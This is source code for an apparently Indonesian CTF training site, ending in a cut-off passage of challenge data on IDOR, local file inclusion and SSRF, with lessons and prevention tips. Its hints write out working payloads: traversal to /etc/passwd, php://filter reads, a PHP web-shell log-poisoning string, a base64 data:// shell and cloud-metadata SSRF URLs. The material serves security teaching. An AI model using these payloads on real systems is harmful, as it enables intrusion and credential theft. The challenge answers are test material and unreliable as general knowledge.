<!doctype html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="RUY CTF Academy — ruang latihan dan progres belajar pribadi.">
<title>Ruy CTF Academy</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');

:root{
  --bg:#f5f2ea; --surface:#ffffff; --surface-2:#f0ece2; --surface-3:#e8e2d4; --border:#ded5c2; --border-soft:#e9e3d5;
  --text:#221d16; --text-dim:#6b6252; --text-faint:#9a917d;
  --web:#7c4fc7; --web-bg:#f1ebfb; --web-soft:#efe8fa;
  --forensic:#0e8a6f; --forensic-bg:#e6f6f0; --forensic-soft:#e2f5ee;
  --crypto:#c07610; --crypto-bg:#fbf0dc; --crypto-soft:#faeed6;
  --good:#1a8a53; --good-bg:#e7f6ee; --bad:#c0392b; --bad-bg:#fbebe8; --accent:#221d16;
  --locked:#cfc6b0;
  --shadow-sm:0 1px 2px rgba(34,29,22,.05), 0 1px 1px rgba(34,29,22,.04);
  --shadow-md:0 4px 14px rgba(34,29,22,.08), 0 1px 3px rgba(34,29,22,.05);
  --radius-sm:6px; --radius-md:10px; --radius-lg:14px;
  --sp-1:4px; --sp-2:8px; --sp-3:12px; --sp-4:16px; --sp-5:20px; --sp-6:28px; --sp-7:40px;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --bg:#0d0b08; --surface:#17140e; --surface-2:#1e1a13; --surface-3:#28221782; --border:#332c1f; --border-soft:#2a2418;
    --text:#efe9da; --text-dim:#a89b81; --text-faint:#786c56;
    --web:#c9a3f5; --web-bg:#251a34; --web-soft:#2c2140;
    --forensic:#5fdcbe; --forensic-bg:#0f2620; --forensic-soft:#123028;
    --crypto:#f3bd6b; --crypto-bg:#2a1f0e; --crypto-soft:#332612;
    --good:#5cd694; --good-bg:#0f2a1c; --bad:#ef7a6a; --bad-bg:#2c1512; --accent:#f5efdd;
    --locked:#3b3324;
    --shadow-sm:0 1px 2px rgba(0,0,0,.3); --shadow-md:0 8px 24px rgba(0,0,0,.4);
  }
}
:root[data-theme="dark"]{
  --bg:#0d0b08; --surface:#17140e; --surface-2:#1e1a13; --surface-3:#28221782; --border:#332c1f; --border-soft:#2a2418;
  --text:#efe9da; --text-dim:#a89b81; --text-faint:#786c56;
  --web:#c9a3f5; --web-bg:#251a34; --web-soft:#2c2140;
  --forensic:#5fdcbe; --forensic-bg:#0f2620; --forensic-soft:#123028;
  --crypto:#f3bd6b; --crypto-bg:#2a1f0e; --crypto-soft:#332612;
  --good:#5cd694; --good-bg:#0f2a1c; --bad:#ef7a6a; --bad-bg:#2c1512; --accent:#f5efdd;
  --locked:#3b3324;
  --shadow-sm:0 1px 2px rgba(0,0,0,.3); --shadow-md:0 8px 24px rgba(0,0,0,.4);
}

*{ box-sizing:border-box; }
body{ background:var(--bg); color:var(--text); font-family:'IBM Plex Sans',system-ui,sans-serif; line-height:1.6; -webkit-font-smoothing:antialiased; }
h1,h2,h3,h4{ font-family:'IBM Plex Mono',ui-monospace,monospace; text-wrap:balance; letter-spacing:-0.01em; margin:0; font-weight:600; }
p{ margin:0; }
code,.mono,input,textarea{ font-family:'IBM Plex Mono',ui-monospace,monospace; }
a{ color:inherit; text-decoration:none; }

/* ---- buttons ---- */
button{
  cursor:pointer; border:1px solid var(--border); background:var(--surface); color:var(--text);
  border-radius:var(--radius-sm); padding:9px 15px; font-size:13px; font-family:'IBM Plex Sans',sans-serif;
  font-weight:500; transition:border-color .14s, background .14s, transform .1s, box-shadow .14s;
  box-shadow:var(--shadow-sm);
}
button:hover:not(:disabled){ border-color:var(--text-faint); }
button:active:not(:disabled){ transform:translateY(1px); }
button:disabled{ opacity:.4; cursor:not-allowed; box-shadow:none; }
button.primary{ background:var(--accent); color:var(--bg); border-color:var(--accent); font-weight:600; }
button.primary:hover:not(:disabled){ opacity:.9; }
input:focus-visible,textarea:focus-visible,button:focus-visible,a:focus-visible{ outline:2px solid var(--web); outline-offset:2px; }

input[type=text],input[type=password],textarea{
  background:var(--surface-2); border:1px solid var(--border); border-radius:var(--radius-sm);
  color:var(--text); padding:10px 12px; font-size:13.5px; width:100%; transition:border-color .14s;
}
input[type=text]:focus,input[type=password]:focus,textarea:focus{ border-color:var(--web); outline:none; }
select{ background:var(--surface-2); border:1px solid var(--border); border-radius:var(--radius-sm); color:var(--text); padding:9px 10px; font-family:'IBM Plex Mono',monospace; font-size:13px; }

.hidden{ display:none !important; }

/* ---- shell chrome (fixed dark brand chrome, independent of content theme) ---- */
:root{
  --shell-bg:#120f0a; --shell-surface:#191510; --shell-border:#2c2517;
  --shell-text:#efe8d6; --shell-text-dim:#9d9078; --shell-text-faint:#6f6650;
  --shell-active-bg:#2a2035; --shell-accent:#b98cf0;
}

.topbar{
  position:sticky; top:0; z-index:30; height:58px;
  background:var(--shell-bg); border-bottom:1px solid var(--shell-border);
  display:flex; align-items:center;
}
.topbar-row{ width:100%; max-width:1240px; margin:0 auto; padding:0 18px; display:flex; align-items:center; justify-content:space-between; gap:16px; }
.brand{ display:flex; align-items:center; gap:8px; font-weight:700; font-size:15.5px; color:var(--shell-text); flex-shrink:0; }
.brand .flag-ico{ font-size:17px; }
.brand-text b{ color:var(--shell-accent); font-weight:800; }
.sidebar-toggle{
  display:none; flex-direction:column; justify-content:center; gap:4px; width:32px; height:32px; padding:0;
  background:transparent; border:none; box-shadow:none; flex-shrink:0;
}
.sidebar-toggle span{ display:block; width:18px; height:2px; background:var(--shell-text-dim); border-radius:2px; }
.nav-right{ display:flex; align-items:center; gap:10px; }
.lang-switch{ display:flex; border:1px solid var(--shell-border); border-radius:20px; overflow:hidden; background:var(--shell-surface); }
.lang-switch button{
  border:none; border-radius:0; background:transparent; color:var(--shell-text-faint); box-shadow:none;
  padding:6px 10px; font-size:14px; line-height:1;
}
.lang-switch button.active{ background:var(--shell-active-bg); color:var(--shell-text); }
.score-pill{
  font-family:'IBM Plex Mono',monospace; font-size:11.5px; font-weight:600; border:1px solid var(--shell-border);
  border-radius:20px; padding:6px 12px; background:var(--shell-surface); color:var(--shell-text);
}
.user-chip{ display:flex; align-items:center; gap:7px; }
.user-avatar{
  width:26px; height:26px; border-radius:50%; background:var(--shell-active-bg); color:var(--shell-accent);
  display:flex; align-items:center; justify-content:center; font-size:11.5px; font-weight:700; font-family:'IBM Plex Mono',monospace;
}
.learner-name{ font-weight:600; color:var(--shell-text); font-size:13px; }
@media (max-width:640px){ .learner-name{ display:none; } }

/* ---- app shell: sidebar + main ---- */
.app-shell{ display:flex; align-items:flex-start; max-width:1240px; margin:0 auto; position:relative; }
.sidebar{
  width:232px; flex-shrink:0; position:sticky; top:58px; height:calc(100vh - 58px); overflow-y:auto;
  background:var(--shell-bg); border-right:1px solid var(--shell-border); padding:22px 14px 40px;
}
.sidebar-label{ font-family:'IBM Plex Mono',monospace; font-size:10px; letter-spacing:.1em; text-transform:uppercase; color:var(--shell-text-faint); padding:0 10px; margin:18px 0 8px; }
.sidebar-label:first-child{ margin-top:0; }
.sidebar-link{
  display:flex; align-items:center; gap:10px; padding:9px 10px; border-radius:8px; color:var(--shell-text-dim);
  font-size:13px; font-weight:500; margin-bottom:2px; transition:background .12s,color .12s;
}
.sidebar-link:hover{ background:var(--shell-surface); color:var(--shell-text); }
.sidebar-link.active{ background:var(--shell-active-bg); color:var(--shell-text); }
.sidebar-link .ic{ font-size:15px; width:18px; text-align:center; flex-shrink:0; }
.sidebar-cat{ display:flex; flex-direction:column; gap:6px; padding:9px 10px; border-radius:8px; margin-bottom:3px; color:var(--shell-text-dim); }
.sidebar-cat:hover{ background:var(--shell-surface); }
.sidebar-cat.active{ background:var(--shell-active-bg); }
.sidebar-cat-top{ display:flex; align-items:center; justify-content:space-between; gap:8px; font-size:13px; font-weight:600; color:var(--shell-text); }
.sidebar-cat-top .ic{ font-size:14px; margin-right:8px; }
.sidebar-cat-pct{ font-family:'IBM Plex Mono',monospace; font-size:10.5px; color:var(--shell-text-faint); font-variant-numeric:tabular-nums; }
.sidebar-track{ height:4px; border-radius:3px; background:var(--shell-border); overflow:hidden; }
.sidebar-fill{ height:100%; border-radius:3px; }
.sidebar-stats{ margin-top:20px; padding:14px 12px; border-radius:10px; background:var(--shell-surface); border:1px solid var(--shell-border); }
.sidebar-stats .row{ display:flex; justify-content:space-between; font-size:11.5px; color:var(--shell-text-dim); margin-bottom:6px; }
.sidebar-stats .row:last-child{ margin-bottom:0; }
.sidebar-stats .row b{ color:var(--shell-text); font-family:'IBM Plex Mono',monospace; }
.shell-scrim{ display:none; }

.main{ flex:1; min-width:0; padding:0 24px 110px; max-width:940px; }
@media (max-width:860px){
  .sidebar-toggle{ display:flex; }
  .sidebar{
    position:fixed; left:0; top:58px; z-index:35; height:calc(100vh - 58px);
    transform:translateX(-100%); transition:transform .2s; box-shadow:var(--shadow-md);
  }
  .sidebar.open{ transform:translateX(0); }
  .shell-scrim.open{ display:block; position:fixed; inset:58px 0 0 0; background:rgba(0,0,0,.45); z-index:34; }
  .main{ padding:0 16px 90px; }
}

/* ---- dashboard hero ---- */
.hero{ padding:32px 0 6px; }
.eyebrow{ font-family:'IBM Plex Mono',monospace; font-size:11px; letter-spacing:.12em; text-transform:uppercase; color:var(--text-dim); margin-bottom:10px; }
.hero h1{ font-size:clamp(28px,4.6vw,40px); margin-bottom:10px; line-height:1.1; }
.hero p{ color:var(--text-dim); max-width:62ch; font-size:15px; margin:0; }

.stat-strip{ display:flex; gap:1px; background:var(--border-soft); border:1px solid var(--border-soft); border-radius:var(--radius-md); overflow:hidden; margin:22px 0 0; }
.stat-cell{ flex:1; background:var(--surface); padding:14px 18px; display:flex; flex-direction:column; gap:2px; }
.stat-num{ font-family:'IBM Plex Mono',monospace; font-size:22px; font-weight:700; color:var(--text); font-variant-numeric:tabular-nums; }
.stat-of{ font-size:14px; color:var(--text-faint); font-weight:500; }
.stat-lbl{ font-size:11px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.05em; }
@media (max-width:560px){ .stat-strip{ flex-wrap:wrap; } .stat-cell{ min-width:45%; } }

/* ---- category cards (dashboard) ---- */
.cat-grid{ display:grid; grid-template-columns:repeat(3,1fr); gap:16px; margin:30px 0 40px; }
@media (max-width:760px){ .cat-grid{ grid-template-columns:1fr; } }
.cat-card{
  border:1px solid var(--border); border-radius:var(--radius-lg); padding:22px; background:var(--surface);
  display:flex; flex-direction:column; gap:14px; text-align:left; box-shadow:var(--shadow-sm);
  transition:transform .16s, box-shadow .16s, border-color .16s;
}
.cat-card:hover{ transform:translateY(-2px); box-shadow:var(--shadow-md); border-color:var(--text-faint); }
.cat-card .icon{ width:38px; height:38px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:18px; }
.cat-card h3{ font-size:16px; }
.cat-card p.desc{ font-size:12.5px; color:var(--text-dim); margin:0; line-height:1.55; }
.cat-card.web .icon{ background:var(--web-bg); color:var(--web); }
.cat-card.forensics .icon{ background:var(--forensic-bg); color:var(--forensic); }
.cat-card.crypto .icon{ background:var(--crypto-bg); color:var(--crypto); }
.progress-track{ height:6px; border-radius:4px; background:var(--surface-3); overflow:hidden; }
.progress-fill{ height:100%; border-radius:4px; transition:width .3s; }
.cat-card.web .progress-fill{ background:var(--web); }
.cat-card.forensics .progress-fill{ background:var(--forensic); }
.cat-card.crypto .progress-fill{ background:var(--crypto); }
.progress-label{ font-size:11.5px; color:var(--text-dim); display:flex; justify-content:space-between; font-variant-numeric:tabular-nums; }
.cert-badge{ font-size:11px; font-weight:600; padding:4px 10px; border-radius:20px; display:inline-flex; align-items:center; gap:5px; width:fit-content; }
.cert-badge.done{ background:var(--good-bg); color:var(--good); border:1px solid var(--good); }
.cert-badge.pending{ background:var(--surface-2); color:var(--text-faint); border:1px solid var(--border); }

/* ---- category page ---- */
.breadcrumb{ font-size:12.5px; color:var(--text-faint); margin-bottom:18px; display:flex; gap:6px; flex-wrap:wrap; }
.breadcrumb a:hover{ color:var(--text); text-decoration:underline; }
.cat-header{ display:flex; align-items:center; gap:12px; margin-bottom:2px; }
.cat-header .dot{ width:10px; height:10px; border-radius:50%; flex-shrink:0; }
.cat-header h1{ font-size:25px; }
.cat-tagline{ color:var(--text-dim); font-size:13.5px; max-width:68ch; margin:8px 0 24px; line-height:1.6; }

.tier-block{ margin-bottom:22px; border:1px solid var(--border); border-radius:var(--radius-lg); overflow:hidden; background:var(--surface); }
.tier-head{ padding:14px 18px; display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; background:var(--surface-2); border-bottom:1px solid var(--border-soft); }
.tier-head .lbl{ font-size:13px; font-weight:600; display:flex; align-items:center; gap:9px; }
.tier-head .lvl-num{ font-family:'IBM Plex Mono',monospace; font-size:10.5px; font-weight:600; color:var(--text-dim); background:var(--surface-3); padding:2px 7px; border-radius:4px; letter-spacing:.03em; }
.tier-lock-msg{ font-size:11.5px; color:var(--text-faint); }
.chal-grid{ display:grid; grid-template-columns:repeat(3,1fr); gap:1px; background:var(--border-soft); padding:1px; }
@media (max-width:700px){ .chal-grid{ grid-template-columns:1fr; } }
.chal-card{
  background:var(--surface); padding:16px 18px; display:flex; flex-direction:column; gap:9px; text-align:left;
  border:none; border-radius:0; transition:background .14s;
}
.chal-card:hover{ background:var(--surface-2); }
.chal-card.locked{ background:var(--surface); opacity:.45; cursor:not-allowed; }
.chal-card .topic-tag{ font-size:10px; letter-spacing:.07em; text-transform:uppercase; color:var(--text-faint); font-family:'IBM Plex Mono',monospace; font-weight:600; }
.chal-card h4{ font-size:13.5px; line-height:1.4; font-weight:600; }
.chal-card .pts{ font-size:11px; color:var(--text-dim); margin-top:auto; display:flex; justify-content:space-between; align-items:center; font-variant-numeric:tabular-nums; }
.solved-tick{ color:var(--good); font-weight:700; }

/* ---- challenge detail ---- */
.chal-detail-head{ display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:8px; }
.badge{ font-size:10.5px; font-family:'IBM Plex Mono',monospace; font-weight:600; letter-spacing:.05em; text-transform:uppercase; border:1px solid var(--border); border-radius:20px; padding:4px 10px; color:var(--text-dim); background:var(--surface-2); }
.chal-detail h1{ font-size:23px; margin:6px 0 6px; line-height:1.25; }
.scenario{ font-size:14.5px; color:var(--text-dim); max-width:72ch; margin:8px 0 24px; line-height:1.65; }

.term{
  background:var(--surface-2); border:1px solid var(--border); border-radius:var(--radius-md);
  padding:16px 18px; font-family:'IBM Plex Mono',monospace; font-size:12.5px; line-height:1.65;
  color:var(--text); margin:14px 0; overflow-x:auto; white-space:pre-wrap; word-break:break-all;
  box-shadow:inset 0 1px 3px rgba(0,0,0,.04);
}
.term .dim{ color:var(--text-faint); }
.term .hl{ color:var(--bad); font-weight:600; }

.panel{ border:1px solid var(--border); border-radius:var(--radius-lg); padding:20px; margin:16px 0; background:var(--surface); box-shadow:var(--shadow-sm); }
.panel h4{ font-size:11.5px; letter-spacing:.06em; text-transform:uppercase; color:var(--text-faint); margin-bottom:14px; font-weight:600; }
.field-row{ display:flex; gap:8px; flex-wrap:wrap; align-items:center; margin-bottom:10px; }
.field-row input{ flex:1; min-width:180px; }
.chip-row{ display:flex; gap:7px; flex-wrap:wrap; margin-bottom:12px; }
.chip{ font-size:12px; font-family:'IBM Plex Mono',monospace; font-weight:500; border:1px solid var(--border); border-radius:7px; padding:6px 12px; background:var(--surface-2); cursor:pointer; transition:border-color .14s, background .14s; }
.chip:hover{ border-color:var(--web); background:var(--web-soft); color:var(--web); }
.result-line{ font-size:13px; margin-top:10px; padding:11px 14px; border-radius:var(--radius-sm); font-family:'IBM Plex Mono',monospace; line-height:1.55; }
.result-line.ok{ background:var(--good-bg); color:var(--good); border:1px solid var(--good); }
.result-line.bad{ background:var(--surface-2); color:var(--text-dim); border:1px solid var(--border); }

/* MCQ choice list */
.mcq-options{ display:flex; flex-direction:column; gap:8px; }
.mcq-opt{
  display:flex; align-items:center; gap:12px; text-align:left; width:100%;
  padding:12px 16px; border-radius:var(--radius-md); background:var(--surface-2); border:1px solid var(--border);
  font-size:13px; font-weight:500; font-family:'IBM Plex Sans',sans-serif;
}
.mcq-opt:hover:not(:disabled){ border-color:var(--web); background:var(--web-soft); }
.mcq-opt-mark{
  flex-shrink:0; width:24px; height:24px; border-radius:50%; background:var(--surface-3); color:var(--text-dim);
  display:flex; align-items:center; justify-content:center; font-family:'IBM Plex Mono',monospace; font-size:11.5px; font-weight:700;
}

.tabs-row{ display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px; }
.tabs-row button.active{ background:var(--accent); color:var(--bg); border-color:var(--accent); }

.hints-list{ display:flex; flex-direction:column; gap:8px; }
.hint-item{ font-size:13px; }
.hint-item button{ width:100%; text-align:left; background:var(--surface-2); }
.hint-text{ background:var(--web-soft); border:1px solid var(--border-soft); border-radius:var(--radius-sm); padding:11px 14px; margin-top:6px; color:var(--text); font-size:13px; line-height:1.55; }

.flag-form{ display:flex; gap:8px; flex-wrap:wrap; }
.flag-form input{ flex:1; min-width:220px; }
.solved-banner{
  border:1px solid var(--good); background:var(--good-bg); color:var(--good);
  border-radius:var(--radius-md); padding:13px 18px; font-size:13.5px; font-weight:600; margin-bottom:16px;
  display:flex; align-items:center; gap:9px;
}

/* AI chat */
.chat-log{ display:flex; flex-direction:column; gap:10px; max-height:320px; overflow-y:auto; margin-bottom:12px; padding-right:2px; }
.chat-msg{ font-size:13px; padding:10px 13px; border-radius:var(--radius-md); max-width:88%; line-height:1.55; }
.chat-msg.user{ background:var(--surface-3); align-self:flex-end; }
.chat-msg.ai{ background:var(--web-soft); color:var(--text); align-self:flex-start; border:1px solid var(--border-soft); }
.chat-input-row{ display:flex; gap:8px; }
.chat-input-row textarea{ flex:1; resize:vertical; min-height:42px; }
.ai-note{ font-size:11px; color:var(--text-faint); margin-top:10px; }

/* certificate */
.cert-wrap{ display:flex; justify-content:center; padding:34px 0; }
.certificate{
  width:100%; max-width:740px; border:2px solid var(--accent); border-radius:6px; padding:52px 56px;
  background:var(--surface); position:relative; box-shadow:var(--shadow-md);
}
.certificate::before{
  content:""; position:absolute; inset:11px; border:1px solid var(--border); border-radius:2px; pointer-events:none;
}
.cert-eyebrow{ text-align:center; font-size:11px; letter-spacing:.18em; text-transform:uppercase; color:var(--text-dim); font-weight:600; }
.cert-title{ text-align:center; font-size:29px; margin:12px 0 5px; }
.cert-sub{ text-align:center; font-size:13px; color:var(--text-dim); margin-bottom:28px; }
.cert-name{ text-align:center; font-size:25px; margin:20px 0 8px; border-bottom:1px solid var(--border); padding-bottom:16px; }
.cert-body{ text-align:center; font-size:13.5px; color:var(--text-dim); max-width:50ch; margin:0 auto 24px; line-height:1.65; }
.cert-meta{ display:flex; justify-content:space-between; font-size:11px; color:var(--text-faint); font-family:'IBM Plex Mono',monospace; margin-top:32px; font-variant-numeric:tabular-nums; }
.cert-actions{ display:flex; justify-content:center; gap:10px; margin-top:24px; }

/* modal (onboarding) */
.modal-overlay{ position:fixed; inset:0; background:rgba(10,8,4,.55); backdrop-filter:blur(3px); display:flex; align-items:center; justify-content:center; z-index:50; padding:20px; }
.modal-box{ background:var(--surface); border:1px solid var(--border); border-radius:var(--radius-lg); padding:28px; max-width:420px; width:100%; box-shadow:var(--shadow-md); }
.modal-box h3{ font-size:17px; margin-bottom:10px; }

      "Topik: IDOR dengan sequential ID yang gampang ditebak. Jelaskan konsepnya tanpa kasih ID yang tepat."),
    lvl(2,"UUID Tetap Bocor",
      `Sistem ini pakai UUID (bukan angka urut) buat ID dokumen — susah ditebak. TAPI, salah satu UUID pengguna lain ke-expose di response API lain yang nggak sengaja kamu buka: <code>a7f3e9c2-88b1-4e21-9f0a-551ccf203abc</code>.`,
      "ID nggak bisa ditebak bukan berarti aman — kalau bocor di tempat lain, access control yang hilang tetap bisa dieksploitasi.",
      "Masukin UUID yang udah dikasih di skenario ke field dokumen.",
      "9f8a614bc3d4aec7874102d5ce7e642ccf6f8c55919170afc2d063ad67f23197",
      "Topik: IDOR pada UUID yang bocor dari sumber lain. Jelaskan kenapa UUID bukan pengganti access control."),
    lvl(3,"Horizontal Privilege Escalation",
      `Fitur "Pesan Pribadi" antar user pakai parameter <code>conversation_id</code>. Percakapan kamu: <b>CONV-2201</b>. Coba akses percakapan user lain di level yang sama.`,
      "Sama seperti invoice — coba ID di sekitar milikmu.",
      "Coba: <code>CONV-2199</code>",
      "ee4410cf678ca465d1d1a42ba9866ca33fa804917b5f27d35e906e9bd367fc4b",
      "Topik: IDOR horizontal privilege escalation antar user setara. Jelaskan bedanya dengan vertical, tanpa kasih ID."),
    lvl(4,"Vertical Privilege Escalation",
      `Form "Update Profil" ternyata ngirim field <code>role</code> yang nilainya bisa kamu ubah manual sebelum submit — server nggak pernah cek apakah kamu berhak set role itu.`,
      "Field role ini harusnya read-only di sisi client, tapi validasinya cuma di UI, bukan di server.",
      "Set field role ke <code>admin</code> lalu submit.",
      "3655767acd8b10d66a2e70d43f56325e888fd687157770972cff7cbea3f8d32e",
      "Topik: IDOR vertical privilege escalation lewat parameter role yang bisa dimanipulasi. Jelaskan risikonya tanpa kasih instruksi tepat."),
    lvl(5,"Mass Enumeration API",
      `Endpoint <code>/api/invoices/{id}</code> nggak punya rate limiting. Attacker bisa scraping SEMUA invoice cuma dengan iterasi ID secara massal.`,
      "Daripada cek satu-satu, coba masukin pola range/wildcard buat simulasi enumerasi massal.",
      "Coba: <code>INV-1000..INV-1050</code> atau <code>INV-*</code>",
      "9e31737e23e37df645b372f4672f1f2d74a1ae19f45e633021d2cbd73ae37316",
      "Topik: IDOR mass enumeration akibat tanpa rate limiting. Jelaskan dampak skala besar dari IDOR individual, tanpa kasih pola pasti."),
  ],
},

{
  id:"lfi", tier:2, icon:"📁", title:"Local File Inclusion",
  materi:`<p>Local File Inclusion (LFI) terjadi saat aplikasi baca/include file dari path yang dibentuk pakai input user, tanpa validasi/whitelist path yang ketat. Attacker bisa keluar dari direktori yang dimaksud pakai path traversal (<code>../</code>) buat baca file sensitif di server.</p>
  <p><b>Teknik lanjutan:</b></p>
  <ul>
  <li><b>Filter bypass</b> — kalau server cuma strip <code>../</code> sekali (non-recursive), pola seperti <code>....//</code> bisa nyisa jadi <code>../</code> lagi setelah di-strip.</li>
  <li><b>PHP wrapper</b> — <code>php://filter/convert.base64-encode/resource=</code> bisa baca SOURCE CODE file PHP tanpa dieksekusi (berguna kalau file-nya di-include, bukan cuma ditampilkan).</li>
  <li><b>Log/session poisoning</b> — attacker "nulis" kode berbahaya ke file yang bisa dia kontrol sebagian (log server, session file), lalu include file itu buat eksekusi kode → LFI jadi RCE.</li>
  <li><b>data:// wrapper</b> — kalau <code>allow_url_include</code> aktif, attacker bisa langsung inject kode PHP via base64 data URI.</li>
  </ul>
  <p><b>Pencegahan:</b> whitelist nama file (bukan blacklist path), jangan pernah pakai input user langsung sebagai path, disable wrapper berbahaya, jalankan aplikasi dengan least privilege.</p>`,
  levels:[
    lvl(1,"Basic Path Traversal",
      `Fitur "Preview Dokumen" baca file dari parameter <code>file</code> tanpa validasi. Default: <code>docs/about.txt</code>.`,
      "Parameter file nggak divalidasi — coba keluar dari folder docs pakai ../ berulang.",
      "Coba: <code>../../../../etc/passwd</code>",
      "11e793fe8afc5a0c8034bc00c0f6ebd86dfc959eb8980004491df5246ae2e131",
      "Topik: LFI basic path traversal. Jelaskan konsep ../ tanpa kasih payload lengkap."),
    lvl(2,"Null Byte Bypass (Teknik Lawas)",
      `Sistem lawas ini otomatis nambahin <code>.txt</code> di akhir path apapun yang kamu kasih (<code>fopen($file.".txt")</code>). Ini teknik historis (PHP &lt; 5.3.4) — modern PHP udah nggak rentan, tapi konsepnya penting dipahami.`,
      "Null byte (%00) dulu bisa 'motong' string di C-level meskipun string PHP-nya masih panjang — jadi suffix .txt yang ditempel otomatis nggak pernah kebaca.",
      "Coba: <code>../../../../etc/passwd%00</code>",
      "7cd67eebd7e891c1dba8bcaddd0f54ad5fba1f0f72263fb4308e53d57597ad87",
      "Topik: LFI null byte injection (teknik historis PHP lawas). Jelaskan kenapa ini cuma relevan di sistem lama, tanpa kasih payload lengkap."),
    lvl(3,"PHP Wrapper — Baca Source Code",
      `Kamu mau baca SOURCE CODE file <code>config.php</code> (bukan hasil eksekusinya) — traversal biasa cuma bikin dia dieksekusi jadi halaman kosong.`,
      "PHP punya wrapper filter yang bisa encode isi file jadi base64 dulu sebelum ditampilkan, sehingga PHP-nya nggak sempat dieksekusi.",
      "Coba: <code>php://filter/convert.base64-encode/resource=config.php</code>",
      "48edeffafead645e1a7f33a10df4d0fb59f0104608862d65e10f3645c5d2ca25",
      "Topik: LFI via PHP wrapper php://filter buat baca source code tanpa eksekusi. Jelaskan konsepnya tanpa kasih payload lengkap."),
    lvl(4,"Log Poisoning — Menuju RCE",
      `Header <code>User-Agent</code> kamu ke-log mentah-mentah ke <code>access.log</code> server. Kalau kamu bisa nulis kode PHP ke situ, lalu include log itu via LFI, kode itu bakal DIEKSEKUSI.`,
      "Step 1: 'set' User-Agent kamu jadi kode PHP. Step 2: include file log-nya lewat parameter file, sama seperti traversal biasa.",
      "User-Agent: <code>&lt;?php system($_GET['cmd']); ?&gt;</code> — lalu include: <code>../../../../var/log/access.log</code>",
      "4043698ca7316ba2823571b5470481e595a230a133f7a9aae9ef1dbb1a05ad9a",
      "Topik: LFI ke RCE lewat log poisoning (User-Agent header). Jelaskan alur dua tahapnya tanpa kasih payload lengkap."),
    lvl(5,"data:// Wrapper — Direct Code Injection",
      `Server ini punya <code>allow_url_include</code> aktif (misconfig langka tapi nyata). Kamu bisa inject kode PHP LANGSUNG lewat data URI, tanpa perlu log poisoning.`,
      "Wrapper data:// bisa nyisipin konten (termasuk kode PHP) langsung dalam bentuk base64, lalu di-include seakan-akan itu file PHP asli.",
      "Format: <code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</code> (itu base64 dari <code>&lt;?php system($_GET['cmd']); ?&gt;</code>)",
      "5adba3d1d2abdfd25729f117c21738208e7b584c47e33e0c04c981bbdfcf8d37",
      "Topik: LFI ke RCE via data:// wrapper (butuh allow_url_include aktif). Jelaskan kenapa ini misconfig langka tapi berbahaya, tanpa kasih payload lengkap."),
  ],
},

{
  id:"ssrf", tier:2, icon:"🌐", title:"SSRF",
  materi:`<p>Server-Side Request Forgery (SSRF) terjadi saat aplikasi bisa dipaksa bikin HTTP request ke URL pilihan attacker, ATAS NAMA server itu sendiri. Ini berbahaya karena server biasanya punya akses ke jaringan internal yang nggak bisa dijangkau langsung dari luar — termasuk cloud metadata service (<code>169.254.169.254</code>) yang sering nyimpen credential sensitif.</p>
  <p><b>Teknik bypass filter SSRF:</b></p>
  <ul>
  <li><b>Open redirect chaining</b> — URL publik yang di-whitelist tapi redirect ke target internal.</li>
  <li><b>DNS rebinding</b> — domain resolve ke IP publik saat dicek, lalu ke IP internal saat request beneran dikirim.</li>
  <li><b>IP encoding</b> — representasi IP alternatif (desimal, hex, IPv6-mapped) buat lolos blacklist string literal.</li>
  </ul>
  <p><b>Pencegahan:</b> allowlist (bukan blacklist) domain/IP tujuan, disable HTTP redirect follow otomatis, network segmentation supaya server aplikasi nggak punya akses langsung ke service internal sensitif.</p>`,
  levels:[
    lvl(1,"Metadata Service Basic",
      `Fitur "Cek Status URL" fetch URL apa aja dari server, termasuk internal.`,
      "Coba alamat metadata service cloud internal (169.254.169.254).",
      "Coba: <code>http://169.254.169.254/latest/meta-data/</code>",
      "02b4ec5bbec81659f16f5952083f0e5ab626fd7cd65c0c4bc05320bb6cf47427",
      "Topik: SSRF ke cloud metadata service. Jelaskan kenapa endpoint ini target favorit, tanpa kasih URL final."),
    lvl(2,"Open Redirect Chaining",
      `Server ini nge-block URL yang mengandung <code>169.254</code> secara langsung. TAPI ada domain redirector publik <code>safe-redirect.example</code> yang di-whitelist dan nggak dicek redirect-nya.`,
      "Bikin URL yang ngarah ke domain publik yang di-whitelist, tapi domain itu redirect ke target internal.",
      "Coba: <code>https://safe-redirect.example/go?to=http://169.254.169.254/latest/meta-data/</code>",
      "936a1b43105bfbe1b921785371ca913176ee176bebfd2fccc5f018f8d47c966a",
      "Topik: SSRF via open redirect chaining buat bypass blacklist. Jelaskan konsepnya tanpa kasih URL final."),
    lvl(3,"DNS Rebinding — Konsep",
      `Pilih penjelasan yang paling TEPAT soal DNS rebinding sebagai teknik bypass SSRF filter.`,
      "Filter SSRF sering cek IP resolusi domain SEKALI di awal (waktu validasi), padahal request beneran dikirim belakangan.",
      "Kuncinya: domain resolve beda antara waktu VALIDASI dan waktu REQUEST beneran dikirim.",
      "90d628b6c9bbea0df33d2ec50fbeb8c1b3fc8fc265de3f8efff9528fe0f12b34",
      "Topik: SSRF DNS rebinding, konsep TOCTOU pada DNS resolution. Jelaskan tanpa kasih jawaban MCQ final."),
    lvl(4,"IP Encoding Bypass",
      `Filter ngeblok string literal <code>127.0.0.1</code> dan <code>169.254.169.254</code> persis, tapi nggak decode representasi IP alternatif.`,
      "127.0.0.1 bisa direpresentasikan dalam bentuk desimal (2130706433) atau hex (0x7f000001) — filter yang cuma cocokin string literal nggak nangkep ini.",
      "Coba: <code>http://2130706433/</code> atau <code>http://0x7f000001/</code>",
      "28c8b24cab82e7662766e119be955efcac0b1ed5621d6d47d78deb5280491aff",
      "Topik: SSRF IP encoding bypass (desimal/hex). Jelaskan kenapa filter string literal nggak cukup, tanpa kasih payload lengkap."),
    lvl(5,"Internal Pivot",
      `Setelah dapet token dari metadata service, kamu tau ada host internal lain: <code>internal-billing.local:8080/admin</code> — yang sebelumnya nggak diketahui dari luar.`,
